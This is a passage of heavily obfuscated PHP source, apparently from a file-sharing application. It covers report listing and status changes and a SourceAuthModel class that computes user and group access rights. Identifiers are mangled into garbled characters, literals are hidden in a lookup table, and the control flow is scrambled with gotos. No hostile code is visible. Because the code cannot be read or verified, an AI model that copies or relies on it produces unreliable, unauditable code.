$Eïªÿ‡∆Ãá[$FÁÚÛùäü∂[419]], $FÁÚÛùäü∂[1438] => USER_ID, $FÁÚÛùäü∂[29] => $Eïªÿ‡∆Ãá[$FÁÚÛùäü∂[29]], $FÁÚÛùäü∂[405] => $Eïªÿ‡∆Ãá[$FÁÚÛùäü∂[405]]); return Model($FÁÚÛùäü∂[2241])->add($bÙ©Ì‘©êµ); } public function reportList($F√ªÙü‘Ìé) { goto BÒõ‡¥èﬂØ; BÒõ‡¥èﬂØ: $A¿Âπ¨Ê‚Ó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Cú◊ëÖ¯™ı = array(); if ($F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[702]]) { $dÍô«¬ı€€ = $F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[703]] ? $F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[703]] : strtotime(date($A¿Âπ¨Ê‚Ó[2243])); $Cú◊ëÖ¯™ı[$A¿Âπ¨Ê‚Ó[187]] = array($A¿Âπ¨Ê‚Ó[321], array($F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[702]], $dÍô«¬ı€€)); } goto A£∫è˜±–Ò; EÀÉ∞í±êÌ: if (empty($c€ßú‹√“⁄[$A¿Âπ¨Ê‚Ó[354]])) { return array(); } $this->_listDataApply($c€ßú‹√“⁄[$A¿Âπ¨Ê‚Ó[354]]); return $c€ßú‹√“⁄; goto FêÎ≈ù…–õ; A£∫è˜±–Ò: if (isset($F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[29]]) && in_array($F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[29]], array($A¿Âπ¨Ê‚Ó[83], $A¿Âπ¨Ê‚Ó[2246], $A¿Âπ¨Ê‚Ó[2247], $A¿Âπ¨Ê‚Ó[2248], $A¿Âπ¨Ê‚Ó[1921]))) { $Cú◊ëÖ¯™ı[$A¿Âπ¨Ê‚Ó[29]] = $F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[29]]; } if (isset($F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[689]]) && in_array($F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[689]], array($A¿Âπ¨Ê‚Ó[468], $A¿Âπ¨Ê‚Ó[83], $A¿Âπ¨Ê‚Ó[2246], $A¿Âπ¨Ê‚Ó[2247]))) { $Cú◊ëÖ¯™ı[$A¿Âπ¨Ê‚Ó[689]] = $F√ªÙü‘Ìé[$A¿Âπ¨Ê‚Ó[689]]; } $DÓó°ŸÉÖÁ = Input::get($A¿Âπ¨Ê‚Ó[408], $A¿Âπ¨Ê‚Ó[7], $A¿Âπ¨Ê‚Ó[2245], array($A¿Âπ¨Ê‚Ó[2182], $A¿Âπ¨Ê‚Ó[404])); goto eç’Îîá„…; eç’Îîá„…: $a¯çÈò¢Ì¢ = array($A¿Âπ¨Ê‚Ó[402] => $A¿Âπ¨Ê‚Ó[403], $A¿Âπ¨Ê‚Ó[404] => $A¿Âπ¨Ê‚Ó[405]); $A·ƒ¶ ÓòÉ = $A¿Âπ¨Ê‚Ó[2249] . $a¯çÈò¢Ì¢[$DÓó°ŸÉÖÁ]; $c€ßú‹√“⁄ = Model($A¿Âπ¨Ê‚Ó[2241])->where($Cú◊ëÖ¯™ı)->order($A·ƒ¶ ÓòÉ)->selectPage(20); goto EÀÉ∞í±êÌ; FêÎ≈ù…–õ: } public function reportStatus($f€¬Âø§Ùá) { goto b‰» ∫¯≥Ë; b„ŸΩÉﬁàå: $E´Ç ŸÚÈé = Model($DÌ”ùò£¨◊[2241])->where($bê…È¶◊‰ö)->save($A⁄ÚïÇÖìç); if ($f€¬Âø§Ùá[$DÌ”ùò£¨◊[689]] == $DÌ”ùò£¨◊[2246]) { if ($F…≈Èñ÷¡°[$DÌ”ùò£¨◊[419]] != $DÌ”ùò£¨◊[468] && $this->shareFileMeta($F…≈Èñ÷¡°[$DÌ”ùò£¨◊[419]])) { $this->shareFileMeta($F…≈Èñ÷¡°[$DÌ”ùò£¨◊[419]], 0); } $this->remove($F…≈Èñ÷¡°[$DÌ”ùò£¨◊[441]]); return !0; } if ($E´Ç ŸÚÈé && $f€¬Âø§Ùá[$DÌ”ùò£¨◊[689]] == $DÌ”ùò£¨◊[2247]) { $F´ÿÉ·∫Ìû = $A⁄ÚïÇÖìç[$DÌ”ùò£¨◊[689]] == $DÌ”ùò£¨◊[2247] ? 1 : 0; $this->shareFileMeta($F…≈Èñ÷¡°[$DÌ”ùò£¨◊[419]], $F´ÿÉ·∫Ìû); $this->removeByFile($F…≈Èñ÷¡°[$DÌ”ùò£¨◊[419]]); } goto bÜß∂–å£ß; bÜß∂–å£ß: return $E´Ç ŸÚÈé; goto A≤ÿ√õî∫Ó; b‰» ∫¯≥Ë: $DÌ”ùò£¨◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bê…È¶◊‰ö = array($DÌ”ùò£¨◊[367] => $f€¬Âø§Ùá[$DÌ”ùò£¨◊[367]]); $F…≈Èñ÷¡° = Model($DÌ”ùò£¨◊[2241])->where($bê…È¶◊‰ö)->field($DÌ”ùò£¨◊[2250])->find(); goto a¿Ë§Ø‡å∞; a¿Ë§Ø‡å∞: if (!$F…≈Èñ÷¡°) { return !1; } $A⁄ÚïÇÖìç = array($DÌ”ùò£¨◊[689] => $f€¬Âø§Ùá[$DÌ”ùò£¨◊[689]]); if ($f€¬Âø§Ùá[$DÌ”ùò£¨◊[689]] == $DÌ”ùò£¨◊[2247] && $F…≈Èñ÷¡°[$DÌ”ùò£¨◊[689]] == $DÌ”ùò£¨◊[2247]) { $A⁄ÚïÇÖìç[$DÌ”ùò£¨◊[689]] = 0; } goto b„ŸΩÉﬁàå; A≤ÿ√õî∫Ó: } private function removeByFile($c‹ª£Ñ≥°∂) { goto fˆñòÒñÃÛ; C£©∞Ø÷„ö: $E‚ºµ’Ù√é = array_to_keyvalue($CìªØ«æ√€, $CÂà‰ñê≈∏[33], $CÂà‰ñê≈∏[441]); $this->remove($E‚ºµ’Ù√é); goto dáÂÜﬁ§©’; eå£‘ÔΩÔ∂: $dÑÑ“óïﬂÛ = array($CÂà‰ñê≈∏[369] => array($CÂà‰ñê≈∏[7], $d¥ø∫≠ò»“), $CÂà‰ñê≈∏[446] => 1); $CìªØ«æ√€ = Model($CÂà‰ñê≈∏[2083])->where($dÑÑ“óïﬂÛ)->field($CÂà‰ñê≈∏[441])->select(); if (empty($CìªØ«æ√€)) { return; } goto C£©∞Ø÷„ö; fˆñòÒñÃÛ: $CÂà‰ñê≈∏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CìªØ«æ√€ = Model($CÂà‰ñê≈∏[761])->where(array($CÂà‰ñê≈∏[419] => $c‹ª£Ñ≥°∂))->field($CÂà‰ñê≈∏[369])->select(); $d¥ø∫≠ò»“ = array_to_keyvalue($CìªØ«æ√€, $CÂà‰ñê≈∏[33], $CÂà‰ñê≈∏[369]); goto eå£‘ÔΩÔ∂; dáÂÜﬁ§©’: } private function shareFileMeta($c√áÆÙ¢ÌÉ, $BÊ´îå˘ú◊ = null) { $a¥°œ«ÇœÕ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Cëì®ª¥ôò = array($a¥°œ«ÇœÕ[419] => $c√áÆÙ¢ÌÉ, $a¥°œ«ÇœÕ[89] => $a¥°œ«ÇœÕ[2251]); if (is_null($BÊ´îå˘ú◊)) { return Model($a¥°œ«ÇœÕ[2252])->where($Cëì®ª¥ôò)->find(); } $Cëì®ª¥ôò[$a¥°œ«ÇœÕ[359]] = $BÊ´îå˘ú◊; Model($a¥°œ«ÇœÕ[2252])->add($Cëì®ª¥ôò, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\143\x65\137\141\165\x74\x68"; public function getAuth($fÂÈ‘ôÖ’£) { goto dıÏÌÎ´Áò; Aëö√Ÿìê§: $aëë™ÖîŒﬁ = $this->field($F˘¬® ›‘ñ)->order($E¬ßÛ¢òÏ–[367])->where($fëáç¬ÊŸÉ)->select(); $bΩèè©Œá√ = array(); foreach ($aëë™ÖîŒﬁ as $cÃ∞ø∂±®¥) { if (Model($E¬ßÛ¢òÏ–[2254])->listData($cÃ∞ø∂±®¥[$E¬ßÛ¢òÏ–[2235]])) { $bΩèè©Œá√[] = $cÃ∞ø∂±®¥; } } goto Bı¥ä¡ÇáÑ; dıÏÌÎ´Áò: $E¬ßÛ¢òÏ– =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F˘¬® ›‘ñ = $E¬ßÛ¢òÏ–[2253]; $fëáç¬ÊŸÉ = array($E¬ßÛ¢òÏ–[369] => $fÂÈ‘ôÖ’£); goto Aëö√Ÿìê§; Bı¥ä¡ÇáÑ: return $bΩèè©Œá√; goto dÈ™¢‰…∏; dÈ™¢‰…∏: } public function setAuth($e»¥™≥ Çπ, $d ≠ë°öËú) { goto eê∞Ó◊ª≈÷; eê∞Ó◊ª≈÷: $aƒÔåÏ≈“á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c◊ãÌÉ‰ÆÂ = Model($aƒÔåÏ≈“á[1121])->sourceInfo($e»¥™≥ Çπ); if ($c◊ãÌÉ‰ÆÂ[$aƒÔåÏ≈“á[371]] != SourceModel::TYPE_GROUP) { return !1; } goto C±ÎÌ°Çö§; f±±≠ƒ≤ä‰: $this->where(array($aƒÔåÏ≈“á[383] => $e»¥™≥ Çπ))->delete(); $this->addAll($a˘Ñîôœ¥â); return !0; goto F€ı‡ÒÍÈ¬; C±ÎÌ°Çö§: $CøÃ§∞ß”≈ = 1; $Bè‰õÉÜ≥¬ = $c◊ãÌÉ‰ÆÂ[$aƒÔåÏ≈“á[456]]; if ($Bè‰õÉÜ≥¬ != $CøÃ§∞ß”≈) { $DÒ¶÷ò◊Îô = array($aƒÔåÏ≈“á[2106] => $Bè‰õÉÜ≥¬); $d≤Ñú√«ÍÂ = Model($aƒÔåÏ≈“á[2181])->field($aƒÔåÏ≈“á[1438])->where($DÒ¶÷ò◊Îô)->select(); $d≤Ñú√«ÍÂ = array_to_keyvalue($d≤Ñú√«ÍÂ, $aƒÔåÏ≈“á[33], $aƒÔåÏ≈“á[1438]); } goto fÏÖü◊‘¿º; fÏÖü◊‘¿º: $C¥©àπ–«† = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $a˘Ñîôœ¥â = array(); foreach ($d ≠ë°öËú as $AÓ«—ÙËËœ) { if (!in_array($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[371]], $C¥©àπ–«†)) { show_json(LNG($aƒÔåÏ≈“á[2255]), !1); } if ($Bè‰õÉÜ≥¬ != $CøÃ§∞ß”≈) { if ($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[371]] == SourceModel::TYPE_GROUP) { } if ($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[456]] != 0 && !in_array($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[456]], $d≤Ñú√«ÍÂ)) { } } if ($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[456]] == 0) { $AÓ«—ÙËËœ[$aƒÔåÏ≈“á[371]] = SourceModel::TYPE_USER; } $a˘Ñîôœ¥â[] = array($aƒÔåÏ≈“á[369] => $e»¥™≥ Çπ, $aƒÔåÏ≈“á[371] => intval($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[371]]), $aƒÔåÏ≈“á[456] => intval($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[456]]), $aƒÔåÏ≈“á[2235] => intval($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[2235]]) ? intval($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[2235]]) : 0, $aƒÔåÏ≈“á[2236] => intval($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[2236]]) ? intval($AÓ«—ÙËËœ[$aƒÔåÏ≈“á[2236]]) : -1); } goto f±±≠ƒ≤ä‰; F€ı‡ÒÍÈ¬: } public function authClear($BﬁûéûÇÿò) { $e“–èé≈Áû =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c„ˆÔÿÕåÑ = Model($e“–èé≈Áû[1121])->sourceInfo($BﬁûéûÇÿò); $FØòû ÇÁ• = array($BﬁûéûÇÿò); if ($c„ˆÔÿÕåÑ[$e“–èé≈Áû[370]] == $e“–èé≈Áû[83]) { $bèﬁ≥Ùﬂå° = array($e“–èé≈Áû[525] => array($e“–èé≈Áû[483], $c„ˆÔÿÕåÑ[$e“–èé≈Áû[459]] . $BﬁûéûÇÿò . $e“–èé≈Áû[484])); $FØòû ÇÁ• = Model($e“–èé≈Áû[1121])->field($e“–èé≈Áû[383])->where($bèﬁ≥Ùﬂå°)->getField($e“–èé≈Áû[369], !0); $FØòû ÇÁ•[] = $BﬁûéûÇÿò; } $this->where(array($e“–èé≈Áû[383] => array($e“–èé≈Áû[384], $FØòû ÇÁ•)))->delete(); return !0; } public function get($D…Èπ›úî·) { $cñß±¡¶âÂ = $this->getSourceList(array($D…Èπ›úî·), !0); return $cñß±¡¶âÂ[0]; } public function getSourceList($E±„≥Üèàº, $F»—Ö‘Ñü÷ = false) { goto d◊ﬁÏ§À∫°; a•Óäèöàó: $cÍ≥¶ÿﬂæú = array($a”‹´Ü§◊ä[383] => array($a”‹´Ü§◊ä[384], $e»Õ–ìöÙö)); $aáàè∏”èê = $this->field($C≤ËÜıÏ∞†)->where($cÍ≥¶ÿﬂæú)->select(); $aáàè∏”èê = array_to_keyvalue_group($aáàè∏”èê, $a”‹´Ü§◊ä[369]); goto DÜú®÷¯Ñ≥; døïù‰ó€é: $e»Õ–ìöÙö = array_values(array_unique($e»Õ–ìöÙö)); if (!$e»Õ–ìöÙö) { return array(); } $C≤ËÜıÏ∞† = $a”‹´Ü§◊ä[2257]; goto a•Óäèöàó; CîíÓ“‚≠ﬁ: if (!$F»—Ö‘Ñü÷) { $cÍ≥¶ÿﬂæú = array($a”‹´Ü§◊ä[383] => array($a”‹´Ü§◊ä[384], $E±„≥Üèàº)); $F»—Ö‘Ñü÷ = $DÏò∫Ûº«¿->field($a”‹´Ü§◊ä[2256])->where($cÍ≥¶ÿﬂæú)->select(); $F»—Ö‘Ñü÷ = array_to_keyvalue($F»—Ö‘Ñü÷, $a”‹´Ü§◊ä[369]); } $e»Õ–ìöÙö = $E±„≥Üèàº; foreach ($F»—Ö‘Ñü÷ as $f¡èâãïíÎ => $Dúä¢ÙΩº—) { $cöÌâÚæ”£ = $DÏò∫Ûº«¿->parentLevelArray($Dúä¢ÙΩº—[$a”‹´Ü§◊ä[459]]); $e»Õ–ìöÙö = array_merge($e»Õ–ìöÙö, $cöÌâÚæ”£, array($f¡èâãïíÎ)); } goto døïù‰ó€é; DÜú®÷¯Ñ≥: $EÉéî‰ç‡Ê = array(); foreach ($F»—Ö‘Ñü÷ as $b∫˘—ØœËÍ => $bæ°Á∏ëËâ) { $EÉéî‰ç‡Ê[$b∫˘—ØœËÍ] = $this->makeSourceAuth($bæ°Á∏ëËâ, $aáàè∏”èê); } return $EÉéî‰ç‡Ê; goto Dòı÷ ﬂï ; d◊ﬁÏ§À∫°: $a”‹´Ü§◊ä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$E±„≥Üèàº) { return array(); } $DÏò∫Ûº«¿ = Model($a”‹´Ü§◊ä[1121]); goto CîíÓ“‚≠ﬁ; Dòı÷ ﬂï : } public function authDeepCheck($bÌºßõªäÉ) { goto fæ∂ùÂŸº¥; fæ∂ùÂŸº¥: $A´êÏƒßäà =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (_get($GLOBALS, $A´êÏƒßäà[457])) { return !1; } $Cﬂ§Î‹êáï = $this->makeAuthDeep(); goto eÏÚßüëãè; eÏÚßüëãè: if (!in_array($bÌºßõªäÉ, $Cﬂ§Î‹êáï[$A´êÏƒßäà[2258]])) { return !1; } $E‚äõÔ®‚ = array(); foreach ($Cﬂ§Î‹êáï[$A´êÏƒßäà[2259]] as $BéΩ∆ø™ï‘ => $e≤‹Ò÷∂à†) { if (!in_array($bÌºßõªäÉ, $e≤‹Ò÷∂à†)) { continue; } $E‚äõÔ®‚[] = $BéΩ∆ø™ï‘; } goto BºÊÿ©∑ë„; BºÊÿ©∑ë„: $DﬂÉèëø—∑ = $E‚äõÔ®‚ ? $E‚äõÔ®‚[0] : $bÌºßõªäÉ; return array($A´êÏƒßäà[377] => -1, $A´êÏƒßäà[418] => array($A´êÏƒßäà[385] => $A´êÏƒßäà[1035], $A´êÏƒßäà[2112] => $A´êÏƒßäà[468], $A´êÏƒßäà[386] => LNG($A´êÏƒßäà[2260]), $A´êÏƒßäà[2124] => $A´êÏƒßäà[2261]), $A´êÏƒßäà[2262] => array($A´êÏƒßäà[388] => $A´êÏƒßäà[2263], $A´êÏƒßäà[75] => $DﬂÉèëø—∑)); goto F÷óÑ—Ààâ; F÷óÑ—Ààâ: } protected function makeAuthDeep() { goto bΩ°†∞øÕ®; D‰ä∫ﬂ¡ã: $fÏêÁîÓèõ = array_to_keyvalue($fßó∆ÊΩè≠, $B„Ìﬁ‚Üªñ[33], $B„Ìﬁ‚Üªñ[369]); $FÚ ú†åÍÍ = array(); $Cõ≥–åÉ«… = $CπïÈî’Æß; goto C‚‘àËÙÑ≥; D’¬‰¡üøÎ: foreach ($Cáµü£‹ƒÀ as $aò¶ÏÑØ∞è) { $D©ñ¡ÂœìË = $a¡“ı§òúó->getInfo($aò¶ÏÑØ∞è); $F∞πòà∑ÒÙ = $E≤çπ•®«Œ->parentLevelArray($D©ñ¡ÂœìË[$B„Ìﬁ‚Üªñ[459]]); $Cõ≥–åÉ«… = array_merge($Cõ≥–åÉ«…, $F∞πòà∑ÒÙ); } $Cõ≥–åÉ«… = array_values(array_unique($Cõ≥–åÉ«…)); foreach ($Cõ≥–åÉ«… as $aò¶ÏÑØ∞è) { $D©ñ¡ÂœìË = $a¡“ı§òúó->getInfo($aò¶ÏÑØ∞è); $FÚ ú†åÍÍ[] = $D©ñ¡ÂœìË[$B„Ìﬁ‚Üªñ[391]][$B„Ìﬁ‚Üªñ[369]]; $BÖÜ µƒ‡«[$aò¶ÏÑØ∞è] = $D©ñ¡ÂœìË[$B„Ìﬁ‚Üªñ[391]][$B„Ìﬁ‚Üªñ[369]]; $Dª‡“∆¨€ü[$aò¶ÏÑØ∞è] = $E≤çπ•®«Œ->parentLevelArray($D©ñ¡ÂœìË[$B„Ìﬁ‚Üªñ[459]]); } goto c€íîòŒãí; b≥ÔëùÍà”: return $A¢è–±ß–ﬁ; goto a£ˆˆÿŸ¿´; bΩ°†∞øÕ®: $B„Ìﬁ‚Üªñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $A¢è–±ß–ﬁ = false; if ($A¢è–±ß–ﬁ) { return $A¢è–±ß–ﬁ; } goto bíúÔÃ‡ˆ; bíúÔÃ‡ˆ: $C’ı∑ÁêØÍ = Model($B„Ìﬁ‚Üªñ[2264])->listData(); $cÑÜ™ﬁëãú = array(); foreach ($C’ı∑ÁêØÍ as $Dæî˘‰‹„≥) { if ($Dæî˘‰‹„≥[$B„Ìﬁ‚Üªñ[376]] == 0 && $Dæî˘‰‹„≥[$B„Ìﬁ‚Üªñ[2126]] == $B„Ìﬁ‚Üªñ[83]) { $cÑÜ™ﬁëãú[] = $Dæî˘‰‹„≥[$B„Ìﬁ‚Üªñ[367]]; } } goto bî˜ÿ»Úÿ≈; c€íîòŒãí: foreach ($eòüÁìçØŒ as $BÉÿ›â–∞‡ => $B¬¿òŸµ¬ª) { $BÀŒÂ˜Œô¿ = $eÔ∫¶Ç”á[$BÉÿ›â–∞‡]; if (!$BÀŒÂ˜Œô¿ || !$BÖÜ µƒ‡«[$BÀŒÂ˜Œô¿]) { continue; } $cèπ◊èÛ‹è = array(); foreach ($Dª‡“∆¨€ü[$BÀŒÂ˜Œô¿] as $aò¶ÏÑØ∞è) { $cèπ◊èÛ‹è[] = $BÖÜ µƒ‡«[$aò¶ÏÑØ∞è]; } $eòüÁìçØŒ[$BÉÿ›â–∞‡] = array_merge($cèπ◊èÛ‹è, $B¬¿òŸµ¬ª); } $FÚ ú†åÍÍ = array_values(array_unique($FÚ ú†åÍÍ)); $A¢è–±ß–ﬁ = array($B„Ìﬁ‚Üªñ[2258] => $FÚ ú†åÍÍ, $B„Ìﬁ‚Üªñ[2259] => $eòüÁìçØŒ); goto b≥ÔëùÍà”; D±œÃè£Û∏: $eÔ∫¶Ç”á = array(); $BÖÜ µƒ‡« = array(); $Dª‡“∆¨€ü = array(); goto dªƒúï´Ö°; bî˜ÿ»Úÿ≈: $CπïÈî’Æß = Session::get($B„Ìﬁ‚Üªñ[2219]); $CπïÈî’Æß = array_to_keyvalue($CπïÈî’Æß, $B„Ìﬁ‚Üªñ[33], $B„Ìﬁ‚Üªñ[2106]); $d«ﬁäÑ §— = array($B„Ìﬁ‚Üªñ[371] => SourceModel::TYPE_USER, $B„Ìﬁ‚Üªñ[456] => USER_ID); goto AÕ≈ò ∏®; C‚‘àËÙÑ≥: $E≤çπ•®«Œ = Model($B„Ìﬁ‚Üªñ[1121]); $a¡“ı§òúó = Model($B„Ìﬁ‚Üªñ[458]); $eòüÁìçØŒ = array(); goto D±œÃè£Û∏; AÕ≈ò ∏®: if ($CπïÈî’Æß) { $d«ﬁäÑ §— = array(array($B„Ìﬁ‚Üªñ[371] => SourceModel::TYPE_USER, $B„Ìﬁ‚Üªñ[456] => USER_ID), array($B„Ìﬁ‚Üªñ[371] => SourceModel::TYPE_GROUP, $B„Ìﬁ‚Üªñ[456] => array($B„Ìﬁ‚Üªñ[384], $CπïÈî’Æß)), $B„Ìﬁ‚Üªñ[918] => $B„Ìﬁ‚Üªñ[2187]); } if ($cÑÜ™ﬁëãú) { $d«ﬁäÑ §— = array($d«ﬁäÑ §—, $B„Ìﬁ‚Üªñ[2235] => array($B„Ìﬁ‚Üªñ[2265], $cÑÜ™ﬁëãú)); } $fßó∆ÊΩè≠ = $this->field($B„Ìﬁ‚Üªñ[2266])->where($d«ﬁäÑ §—)->select(); goto D‰ä∫ﬂ¡ã; dªƒúï´Ö°: if ($fÏêÁîÓèõ) { $cÛ©íÖ¥Íû = $E≤çπ•®«Œ->where(array($B„Ìﬁ‚Üªñ[369] => array($B„Ìﬁ‚Üªñ[384], $fÏêÁîÓèõ)))->select(); foreach ($cÛ©íÖ¥Íû as $Fí≈Ãìÿœ±) { $F∞πòà∑ÒÙ = $E≤çπ•®«Œ->parentLevelArray($Fí≈Ãìÿœ±[$B„Ìﬁ‚Üªñ[459]]); $FÚ ú†åÍÍ = array_merge($FÚ ú†åÍÍ, $F∞πòà∑ÒÙ); $Cõ≥–åÉ«…[] = $Fí≈Ãìÿœ±[$B„Ìﬁ‚Üªñ[456]]; $eòüÁìçØŒ[$Fí≈Ãìÿœ±[$B„Ìﬁ‚Üªñ[369]]] = $F∞πòà∑ÒÙ; $eÔ∫¶Ç”á[$Fí≈Ãìÿœ±[$B„Ìﬁ‚Üªñ[369]]] = $Fí≈Ãìÿœ±[$B„Ìﬁ‚Üªñ[456]]; } } $Cõ≥–åÉ«… = array_values(array_unique($Cõ≥–åÉ«…)); $Cáµü£‹ƒÀ = $Cõ≥–åÉ«…; goto D’¬‰¡üøÎ; a£ˆˆÿŸ¿´: } private function makeSourceAuth($dëﬂ ßæ—ˆ, $F◊àÁ”¶ÍÌ) { goto CÖ†Ó‡±¥ÿ; eæ∞œ¿⁄«÷: if (!$fò≠Ñæ©“ && isset($EÃãÎèÜÖæ[$EÑ»â’∆ﬂ˜])) { $díΩ‡ãÙûı = $EÃãÎèÜÖæ[$EÑ»â’∆ﬂ˜]; $E›Îêòä›µ = Model($c†™˘ªÑÂÃ[458])->getInfo($EÑ»â’∆ﬂ˜); $fò≠Ñæ©“ = array($c†™˘ªÑÂÃ[2267] => intval($díΩ‡ãÙûı[$c†™˘ªÑÂÃ[376]][$c†™˘ªÑÂÃ[376]]), $c†™˘ªÑÂÃ[2268] => $díΩ‡ãÙûı[$c†™˘ªÑÂÃ[376]], $c†™˘ªÑÂÃ[2262] => array($c†™˘ªÑÂÃ[388] => $c†™˘ªÑÂÃ[2272], $c†™˘ªÑÂÃ[75] => $E›Îêòä›µ[$c†™˘ªÑÂÃ[391]][$c†™˘ªÑÂÃ[369]], $c†™˘ªÑÂÃ[2271] => $E›Îêòä›µ[$c†™˘ªÑÂÃ[463]])); } if (!$fò≠Ñæ©“) { $E›Îêòä›µ = Model($c†™˘ªÑÂÃ[458])->getInfo($EÑ»â’∆ﬂ˜); $A‚ê‹‚Œ•“ = explode($c†™˘ªÑÂÃ[47], trim($E›Îêòä›µ[$c†™˘ªÑÂÃ[459]], $c†™˘ªÑÂÃ[47])); foreach ($A‚ê‹‚Œ•“ as $cë™êÿƒã‚) { if ($cë™êÿƒã‚ == $c†™˘ªÑÂÃ[468] || $cë™êÿƒã‚ == $B Ñ»ÔñÇË) { continue; } if (!isset($EÃãÎèÜÖæ[$cë™êÿƒã‚])) { continue; } $díΩ‡ãÙûı = $EÃãÎèÜÖæ[$cë™êÿƒã‚]; $fò≠Ñæ©“ = array($c†™˘ªÑÂÃ[2267] => intval($díΩ‡ãÙûı[$c†™˘ªÑÂÃ[376]][$c†™˘ªÑÂÃ[376]]), $c†™˘ªÑÂÃ[2268] => $díΩ‡ãÙûı[$c†™˘ªÑÂÃ[376]], $c†™˘ªÑÂÃ[2262] => array($c†™˘ªÑÂÃ[388] => $c†™˘ªÑÂÃ[2269], $c†™˘ªÑÂÃ[2270] => $E›Îêòä›µ[$c†™˘ªÑÂÃ[391]][$c†™˘ªÑÂÃ[369]], $c†™˘ªÑÂÃ[2271] => $E›Îêòä›µ[$c†™˘ªÑÂÃ[463]])); break; } } if (!$fò≠Ñæ©“ || $fò≠Ñæ©“[$c†™˘ªÑÂÃ[377]] <= 0) { $cÖªÔ≤Æõ– = $this->authDeepCheck($dëﬂ ßæ—ˆ[$c†™˘ªÑÂÃ[369]]); if ($cÖªÔ≤Æõ–) { $fò≠Ñæ©“ = $cÖªÔ≤Æõ–; } } goto e∑ÕÑ¡ë‚â; bÕÍ∆«›Ç: $fò≠Ñæ©“ = !1; foreach ($eÒã˘Õøã° as $bﬂ®±‘Øπö) { if (!isset($F◊àÁ”¶ÍÌ[$bﬂ®±‘Øπö])) { continue; } $CÎﬂ•¯≥≠ì = $this->authMake($F◊àÁ”¶ÍÌ[$bﬂ®±‘Øπö]); if ($CÎﬂ•¯≥≠ì[$c†™˘ªÑÂÃ[418]]) { $fò≠Ñæ©“ = $CÎﬂ•¯≥≠ì; break; } } if (!$aª∫œ≠‡ﬁô) { return $fò≠Ñæ©“; } goto eæ∞œ¿⁄«÷; e∑ÕÑ¡ë‚â: return $fò≠Ñæ©“; goto Få∆’ÙóΩ¿; FõÂÎ◊“Èû: $EÑ»â’∆ﬂ˜ = $dëﬂ ßæ—ˆ[$c†™˘ªÑÂÃ[456]]; $aª∫œ≠‡ﬁô = $dëﬂ ßæ—ˆ[$c†™˘ªÑÂÃ[371]] == SourceModel::TYPE_GROUP; if ($aª∫œ≠‡ﬁô && isset($EÃãÎèÜÖæ[$EÑ»â’∆ﬂ˜]) && !_get($GLOBALS, $c†™˘ªÑÂÃ[457])) { $díΩ‡ãÙûı = $EÃãÎèÜÖæ[$EÑ»â’∆ﬂ˜]; if (Model($c†™˘ªÑÂÃ[2254])->authCheckRoot($díΩ‡ãÙûı[$c†™˘ªÑÂÃ[376]][$c†™˘ªÑÂÃ[376]])) { $E›Îêòä›µ = Model($c†™˘ªÑÂÃ[458])->getInfo($EÑ»â’∆ﬂ˜); $fò≠Ñæ©“ = array($c†™˘ªÑÂÃ[2267] => intval($díΩ‡ãÙûı[$c†™˘ªÑÂÃ[376]][$c†™˘ªÑÂÃ[376]]), $c†™˘ªÑÂÃ[2268] => $díΩ‡ãÙûı[$c†™˘ªÑÂÃ[376]], $c†™˘ªÑÂÃ[2262] => array($c†™˘ªÑÂÃ[388] => $c†™˘ªÑÂÃ[2269], $c†™˘ªÑÂÃ[2270] => $E›Îêòä›µ[$c†™˘ªÑÂÃ[391]][$c†™˘ªÑÂÃ[369]], $c†™˘ªÑÂÃ[2271] => $E›Îêòä›µ[$c†™˘ªÑÂÃ[463]])); return $fò≠Ñæ©“; } } goto bÕÍ∆«›Ç; CÖ†Ó‡±¥ÿ: $c†™˘ªÑÂÃ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EÃãÎèÜÖæ = Session::get($c†™˘ªÑÂÃ[2219]); $EÃãÎèÜÖæ = array_to_keyvalue($EÃãÎèÜÖæ, $c†™˘ªÑÂÃ[2106]); goto CèÛã€í®é; CèÛã€í®é: $B Ñ»ÔñÇË = $c†™˘ªÑÂÃ[83]; $eÒã˘Õøã° = Model($c†™˘ªÑÂÃ[1121])->parentLevelArray($dëﬂ ßæ—ˆ[$c†™˘ªÑÂÃ[459]]); $eÒã˘Õøã° = array_merge(array($dëﬂ ßæ—ˆ[$c†™˘ªÑÂÃ[369]]), array_reverse($eÒã˘Õøã°)); goto FõÂÎ◊“Èû; Få∆’ÙóΩ¿: } public function authOwnerApply($Eè®Ïá®Ωà) { goto aêàè∞êÀê; d—˜•∫î≤Í: $Eè®Ïá®Ωà[$F•àì˘ƒ≠◊[376]][$F•àì˘ƒ≠◊[2275]] = Model($F•àì˘ƒ≠◊[474])->userListInfo($f‡â‘ç¶‚·); return $Eè®Ïá®Ωà; goto eñÌù·÷åŸ; aêàè∞êÀê: $F•àì˘ƒ≠◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if 